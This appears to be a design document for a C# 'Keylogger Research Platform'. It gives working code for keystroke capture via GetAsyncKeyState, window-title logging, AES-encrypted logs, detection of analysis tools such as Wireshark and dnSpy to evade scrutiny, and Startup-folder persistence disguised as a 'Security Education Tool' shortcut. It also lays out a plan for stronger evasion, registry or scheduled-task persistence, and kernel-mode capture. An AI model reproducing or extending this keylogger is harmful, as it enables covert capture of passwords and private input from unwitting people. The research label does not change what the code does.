# Technical Implementation Details

This document provides an in-depth review of the technical architecture, design decisions, and implementation details of the Keylogger Research Platform.

## Architecture Overview

```
┌───────────────────────────────────────┐
│           Keylogger Core              │
├───────────┬───────────────┬───────────┤
│ Input     │ Processing    │ Output    │
│ Subsystem │ Pipeline      │ Handler   │
├───────────┼───────────────┼───────────┤
│ Win32 API │ Encryption    │ File I/O  │
│ Hooks     │ Engine        │ System    │
└───────────┴───────────────┴───────────┘
         │                     ▲
         ▼                     │
┌───────────────────────────────────────┐
│        System Integration Layer       │
├───────────────────┬───────────────────┤
│ Anti-Detection    │ Persistence       │
│ Module            │ Module            │
└───────────────────┴───────────────────┘
```

## Repository Status Update

The technical implementation now includes basic functionality, with non-functional components preserved for future enhancements and research purposes.

## Core Engine Implementation

### Input Monitoring System

The keylogger utilizes the Win32 API to poll keyboard state through `GetAsyncKeyState` in a continuous loop:

```csharp
static void CaptureKeys()
{
    while (true)
    {
        Thread.Sleep(10); // Small delay to reduce CPU usage
        
        // Check for window changes
        CheckActiveWindowChange();
        
        // Check all key states
        for (int i = 0; i < 256; i++)
        {
            int keyState = GetAsyncKeyState(i);
            // Key was pressed since last check (0x8000 = high-order bit set)
            if ((keyState & 0x8000) != 0)
            {
                string keyData = InterpretKeyCode(i);
                if (!string.IsNullOrEmpty(keyData))
                {
                    LogKeypress(keyData);
                }
            }
        }
    }
}
```

#### Design Considerations:

1. **Polling vs. Hooks**: The current implementation uses polling via `GetAsyncKeyState` rather than hooks set through `SetWindowsHookEx`. This approach was chosen for initial simplicity and reliability, though it has higher CPU usage and potentially misses keystrokes if the polling interval is too high.

2. **Thread Sleep**: A 10ms sleep is implemented to reduce CPU load. This balances between responsiveness and resource utilization. Future versions may implement adaptive timing based on system load.

3. **Virtual Key Range**: The loop checks all 256 possible virtual key codes, which is comprehensive but potentially inefficient. Future optimization could focus on commonly used key ranges.

### Key Interpretation Layer

Virtual key codes are translated to human-readable text through a comprehensive mapping function:

```csharp
static string InterpretKeyCode(int keyCode)
{
    // Convert virtual key code to readable format
    switch (keyCode)
    {
        case 0x08: return "[Backspace]";
        case 0x09: return "[Tab]";
        // ...additional mappings...
        default:
            return !char.IsControl((char)keyCode) ? ((char)keyCode).ToString() : "";
    }
}
```

#### Technical Notes:

1. **Character Conversion**: For standard alphanumeric keys, direct casting to `char` is used. This approach works for basic ASCII characters but doesn't account for keyboard layouts or modifier keys.

2. **Control Characters**: The `char.IsControl()` check prevents logging of non-printable control characters.

3. **Future Enhancement**: A more robust approach would account for keyboard state (shift, alt, etc.) and use `ToUnicode` API for accurate character translation across keyboard layouts.

### Window Context Tracking

Active window tracking provides context for keystrokes:

```csharp
static void CheckActiveWindowChange()
{
    IntPtr foregroundWindow = GetForegroundWindow();
    StringBuilder windowTitle = new StringBuilder(256);
    if (GetWindowText(foregroundWindow, windowTitle, 256) > 0)
    {
        string newWindow = windowTitle.ToString();
        if (newWindow != currentActiveWindow)
        {
            currentActiveWindow = newWindow;
            LogKeypress($"\r\n[Window: {currentActiveWindow} - {DateTime.Now}]\r\n");
        }
    }
}
```

#### Implementation Details:

1. **Buffer Size**: The 256-character buffer is based on common window title length constraints but may be insufficient for some applications.

2. **Context Association**: The current implementation inserts window change markers directly into the keystroke log, creating a simple contextual relationship.

3. **Performance Impact**: `GetForegroundWindow` and `GetWindowText` are low-impact API calls, but are called frequently in the main loop.

## Encryption System

### AES Implementation

The project uses AES-256 symmetric encryption with a fixed key:

```csharp
static string Encrypt(string plainText)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = Encoding.UTF8.GetBytes(encryptionKey);
        aes.IV = new byte[16]; // Initialization vector
        
        // Encryption implementation
        // ...
    }
}
```

#### Cryptographic Considerations:

1. **Fixed IV**: The implementation uses a zero-initialized IV, which reduces the cryptographic strength. A random IV per entry would be more secure but require additional storage.

2. **Key Management**: The encryption key is stored as a constant in the code, which presents a major security weakness. A production-grade implementation would use secure key derivation and storage.

3. **Future Enhancement**: Consider implementing asymmetric encryption with a public key for logging, requiring a private key for decryption.

## Anti-Detection Subsystem

The platform implements process enumeration to detect security tools:

```csharp
static bool DetectSecurityTools()
{
    string[] securityTools = new string[] {
        "wireshark", "process explorer", "process monitor", "ida", 
        "ollydbg", "immunity debugger", "dnspy"
    };
    
    Process[] processes = Process.GetProcesses();
    foreach (Process process in processes)
    {
        try {
            string processName = process.ProcessName.ToLower();
            if (securityTools.Any(tool => processName.Contains(tool)))
            {
                return true;
            }
        }
        catch { }
    }
    return false;
}
```

#### Detection Evasion Analysis:

1. **String Matching**: The current implementation uses simple substring matching, which is easily evaded through process renaming. More robust approaches would examine module hashes, window classes, or process behaviors.

2. **Error Handling**: Try-catch blocks prevent crashes when accessing restricted processes but may create timing discrepancies detectable by advanced anti-anti-detection systems.

3. **Future Enhancement**: Consider more sophisticated detection including API hooking checks, timing analysis, and hardware fingerprinting.

## Persistence Mechanism

The project uses the Windows Script Host to establish persistence:

```csharp
static void InstallForPersistence()
{
    try
    {
        string appPath = Assembly.GetExecutingAssembly().Location;
        string startupPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Startup),
            "SecurityEducation.lnk");
        
        // Create shortcut in startup folder
        WshShell shell = new WshShell();
        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(startupPath);
        shortcut.TargetPath = appPath;
        shortcut.WorkingDirectory = Path.GetDirectoryName(appPath);
        shortcut.Description = "Security Education Tool";
        shortcut.Save();
    }
    catch (Exception ex)
    {
        // Error handling
    }
}
```

#### Technical Analysis:

1. **User-Space Persistence**: The implementation uses user-level startup folder integration, which only executes when the user logs in and is easily discoverable.

2. **Shell Objects**: Windows Script Host COM objects provide a clean API for shortcut creation without requiring direct file manipulation.

3. **Future Enhancement**: Registry-based or scheduled task persistence would provide greater resilience and administrative privileges execution.

## Memory Management Considerations

The current implementation has several memory usage patterns worth noting:

1. **String Concatenation**: Frequent string operations in the logging system could lead to heap fragmentation during long-term operation.

2. **Continuous Operations**: The infinite loop design means the application runs continuously without cleanup phases, potentially accumulating memory artifacts.

3. **Win32 Resources**: Some Win32 API calls may allocate unmanaged resources that should be explicitly released.

## Performance Characteristics

Performance testing reveals the following characteristics:

1. **CPU Usage**: Baseline of 1-3% CPU due to the polling approach for key detection.

2. **Memory Footprint**: ~15-20MB private working set after extended operation.

3. **Disk I/O**: Minimal and bursty, correlating directly with user input frequency.

4. **Encryption Overhead**: Negligible for typical keystroke volume, approximately 0.1ms per encryption operation.

## Technical Limitations

1. **Virtualized Environments**: May experience inconsistent behavior in virtualized environments with limited access to hardware I/O.

2. **User Account Control**: Cannot capture keystrokes from higher integrity processes without elevation.

3. **Secure Desktop**: Unable to monitor input during UAC prompts or secure desktop sessions.

4. **Modern Applications**: Some UWP/Windows Store applications use different input methods that bypass traditional keyboard hooks.

## Future Technical Evolution

1. **Kernel-Mode Operations**: Implement a driver-based approach for more reliable key capture.

2. **Context Expansion**: Enhance context capture to include active control focus, not just window titles.

3. **Input Method Editor Support**: Add support for complex input methods and international keyboards.

4. **Graphics Processing**: Implement OCR for on-screen keyboard detection to bypass hardware hook limitations.